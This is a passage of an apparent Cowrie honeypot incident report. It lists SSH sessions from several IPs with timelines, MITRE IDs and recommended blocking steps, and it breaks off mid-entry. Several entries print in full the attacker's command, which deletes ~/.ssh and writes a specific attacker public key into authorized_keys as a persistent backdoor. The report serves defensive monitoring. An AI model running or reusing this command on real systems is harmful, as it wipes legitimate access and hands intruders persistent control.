| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:38 |
| **Last Seen** | 2026-06-02 21:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:38:59` | `cowrie.session.connect` |
| `2026-06-02 21:38:59` | `cowrie.client.version` |
| `2026-06-02 21:38:59` | `cowrie.client.kex` |
| `2026-06-02 21:38:59` | `cowrie.login.success` |
| `2026-06-02 21:38:59` | `cowrie.session.params` |
| `2026-06-02 21:38:59` | `cowrie.command.input` |
| `2026-06-02 21:38:59` | `cowrie.command.failed` |
| `2026-06-02 21:38:59` | `cowrie.log.closed` |
| `2026-06-02 21:39:00` | `cowrie.session.params` |
| `2026-06-02 21:39:00` | `cowrie.command.input` |
| `2026-06-02 21:39:00` | `cowrie.session.file_download` |
| `2026-06-02 21:39:00` | `cowrie.log.closed` |
| `2026-06-02 21:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c62ed18de4a

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:39 |
| **Last Seen** | 2026-06-02 21:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:39:01` | `cowrie.session.connect` |
| `2026-06-02 21:39:01` | `cowrie.client.version` |
| `2026-06-02 21:39:02` | `cowrie.client.kex` |
| `2026-06-02 21:39:02` | `cowrie.login.success` |
| `2026-06-02 21:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a9002bc4c6d

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:39 |
| **Last Seen** | 2026-06-02 21:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:39:10` | `cowrie.session.connect` |
| `2026-06-02 21:39:10` | `cowrie.client.version` |
| `2026-06-02 21:39:10` | `cowrie.client.kex` |
| `2026-06-02 21:39:11` | `cowrie.login.success` |
| `2026-06-02 21:39:12` | `cowrie.session.params` |
| `2026-06-02 21:39:12` | `cowrie.command.input` |
| `2026-06-02 21:39:12` | `cowrie.command.failed` |
| `2026-06-02 21:39:13` | `cowrie.log.closed` |
| `2026-06-02 21:39:13` | `cowrie.session.params` |
| `2026-06-02 21:39:13` | `cowrie.command.input` |
| `2026-06-02 21:39:13` | `cowrie.session.file_download` |
| `2026-06-02 21:39:13` | `cowrie.log.closed` |
| `2026-06-02 21:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-604662fb1a16

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:39 |
| **Last Seen** | 2026-06-02 21:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:39:17` | `cowrie.session.connect` |
| `2026-06-02 21:39:17` | `cowrie.client.version` |
| `2026-06-02 21:39:17` | `cowrie.client.kex` |
| `2026-06-02 21:39:19` | `cowrie.login.success` |
| `2026-06-02 21:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f40bfa7c10a

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:41 |
| **Last Seen** | 2026-06-02 21:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:41:18` | `cowrie.session.connect` |
| `2026-06-02 21:41:18` | `cowrie.client.version` |
| `2026-06-02 21:41:18` | `cowrie.client.kex` |
| `2026-06-02 21:41:18` | `cowrie.login.success` |
| `2026-06-02 21:41:18` | `cowrie.session.params` |
| `2026-06-02 21:41:18` | `cowrie.command.input` |
| `2026-06-02 21:41:19` | `cowrie.command.failed` |
| `2026-06-02 21:41:19` | `cowrie.log.closed` |
| `2026-06-02 21:41:19` | `cowrie.session.params` |
| `2026-06-02 21:41:19` | `cowrie.command.input` |
| `2026-06-02 21:41:19` | `cowrie.session.file_download` |
| `2026-06-02 21:41:19` | `cowrie.log.closed` |
| `2026-06-02 21:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-351f26e9129e

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:41 |
| **Last Seen** | 2026-06-02 21:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:41:21` | `cowrie.session.connect` |
| `2026-06-02 21:41:21` | `cowrie.client.version` |
| `2026-06-02 21:41:21` | `cowrie.client.kex` |
| `2026-06-02 21:41:21` | `cowrie.login.success` |
| `2026-06-02 21:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71d21f35b5bc

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:46 |
| **Last Seen** | 2026-06-02 21:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:46:48` | `cowrie.session.connect` |
| `2026-06-02 21:46:48` | `cowrie.client.version` |
| `2026-06-02 21:46:48` | `cowrie.client.kex` |
| `2026-06-02 21:46:48` | `cowrie.login.success` |
| `2026-06-02 21:46:48` | `cowrie.session.params` |
| `2026-06-02 21:46:48` | `cowrie.command.input` |
| `2026-06-02 21:46:48` | `cowrie.command.failed` |
| `2026-06-02 21:46:49` | `cowrie.log.closed` |
| `2026-06-02 21:46:49` | `cowrie.session.params` |
| `2026-06-02 21:46:49` | `cowrie.command.input` |
| `2026-06-02 21:46:49` | `cowrie.session.file_download` |
| `2026-06-02 21:46:49` | `cowrie.log.closed` |
| `2026-06-02 21:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afb0856fddcc

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:46 |
| **Last Seen** | 2026-06-02 21:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:46:51` | `cowrie.session.connect` |
| `2026-06-02 21:46:51` | `cowrie.client.version` |
| `2026-06-02 21:46:51` | `cowrie.client.kex` |
| `2026-06-02 21:46:51` | `cowrie.login.success` |
| `2026-06-02 21:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97e511ea6df

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:52 |
| **Last Seen** | 2026-06-02 21:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:52:49` | `cowrie.session.connect` |
| `2026-06-02 21:52:49` | `cowrie.client.version` |
| `2026-06-02 21:52:49` | `cowrie.client.kex` |
| `2026-06-02 21:52:50` | `cowrie.login.success` |
| `2026-06-02 21:52:50` | `cowrie.session.params` |
| `2026-06-02 21:52:50` | `cowrie.command.input` |
| `2026-06-02 21:52:50` | `cowrie.command.failed` |
| `2026-06-02 21:52:50` | `cowrie.log.closed` |
| `2026-06-02 21:52:50` | `cowrie.session.params` |
| `2026-06-02 21:52:50` | `cowrie.command.input` |
| `2026-06-02 21:52:50` | `cowrie.session.file_download` |
| `2026-06-02 21:52:50` | `cowrie.log.closed` |
| `2026-06-02 21:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-273efce06952

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:52 |
| **Last Seen** | 2026-06-02 21:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:52:52` | `cowrie.session.connect` |
| `2026-06-02 21:52:52` | `cowrie.client.version` |
| `2026-06-02 21:52:52` | `cowrie.client.kex` |
| `2026-06-02 21:52:52` | `cowrie.login.success` |
| `2026-06-02 21:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2538929aef68

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:54 |
| **Last Seen** | 2026-06-02 21:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:54:52` | `cowrie.session.connect` |
| `2026-06-02 21:54:52` | `cowrie.client.version` |
| `2026-06-02 21:54:52` | `cowrie.client.kex` |
| `2026-06-02 21:54:52` | `cowrie.login.success` |
| `2026-06-02 21:54:52` | `cowrie.session.params` |
| `2026-06-02 21:54:52` | `cowrie.command.input` |
| `2026-06-02 21:54:52` | `cowrie.command.failed` |
| `2026-06-02 21:54:53` | `cowrie.log.closed` |
| `2026-06-02 21:54:53` | `cowrie.session.params` |
| `2026-06-02 21:54:53` | `cowrie.command.input` |
| `2026-06-02 21:54:53` | `cowrie.session.file_download` |
| `2026-06-02 21:54:53` | `cowrie.log.closed` |
| `2026-06-02 21:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b379e2de9e29

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:54 |
| **Last Seen** | 2026-06-02 21:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:54:55` | `cowrie.session.connect` |
| `2026-06-02 21:54:55` | `cowrie.client.version` |
| `2026-06-02 21:54:55` | `cowrie.client.kex` |
| `2026-06-02 21:54:55` | `cowrie.login.success` |
| `2026-06-02 21:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f14d3fc3bfa0

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:56 |
| **Last Seen** | 2026-06-02 21:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:56:52` | `cowrie.session.connect` |
| `2026-06-02 21:56:52` | `cowrie.client.version` |
| `2026-06-02 21:56:52` | `cowrie.client.kex` |
| `2026-06-02 21:56:53` | `cowrie.login.success` |
| `2026-06-02 21:56:53` | `cowrie.session.params` |
| `2026-06-02 21:56:53` | `cowrie.command.input` |
| `2026-06-02 21:56:53` | `cowrie.command.failed` |
| `2026-06-02 21:56:53` | `cowrie.log.closed` |
| `2026-06-02 21:56:53` | `cowrie.session.params` |
| `2026-06-02 21:56:53` | `cowrie.command.input` |
| `2026-06-02 21:56:54` | `cowrie.session.file_download` |
| `2026-06-02 21:56:54` | `cowrie.log.closed` |
| `2026-06-02 21:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-035359f4feaa

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:56 |
| **Last Seen** | 2026-06-02 21:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:56:55` | `cowrie.session.connect` |
| `2026-06-02 21:56:55` | `cowrie.client.version` |
| `2026-06-02 21:56:55` | `cowrie.client.kex` |
| `2026-06-02 21:56:56` | `cowrie.login.success` |
| `2026-06-02 21:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e80b142b186

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-06-02 22:01 |
| **Last Seen** | 2026-06-02 22:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:01:23` | `cowrie.session.connect` |
| `2026-06-02 22:01:23` | `cowrie.client.version` |
| `2026-06-02 22:01:23` | `cowrie.client.kex` |
| `2026-06-02 22:01:24` | `cowrie.login.success` |
| `2026-06-02 22:01:24` | `cowrie.session.params` |
| `2026-06-02 22:01:24` | `cowrie.command.input` |
| `2026-06-02 22:01:24` | `cowrie.command.failed` |
| `2026-06-02 22:01:24` | `cowrie.log.closed` |
| `2026-06-02 22:01:24` | `cowrie.session.params` |
| `2026-06-02 22:01:24` | `cowrie.command.input` |
| `2026-06-02 22:01:25` | `cowrie.session.file_download` |
| `2026-06-02 22:01:25` | `cowrie.log.closed` |
| `2026-06-02 22:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7590f844c077

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-06-02 22:01 |
| **Last Seen** | 2026-06-02 22:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:01:27` | `cowrie.session.connect` |
| `2026-06-02 22:01:27` | `cowrie.client.version` |
| `2026-06-02 22:01:27` | `cowrie.client.kex` |
| `2026-06-02 22:01:27` | `cowrie.login.success` |
| `2026-06-02 22:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84590e234732

| Field | Detail |
|---|---|
| **Source IP** | `111.68.98[.]152` |
| **First Seen** | 2026-06-02 22:09 |
| **Last Seen** | 2026-06-02 22:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:09:30` | `cowrie.session.connect` |
| `2026-06-02 22:09:30` | `cowrie.client.version` |
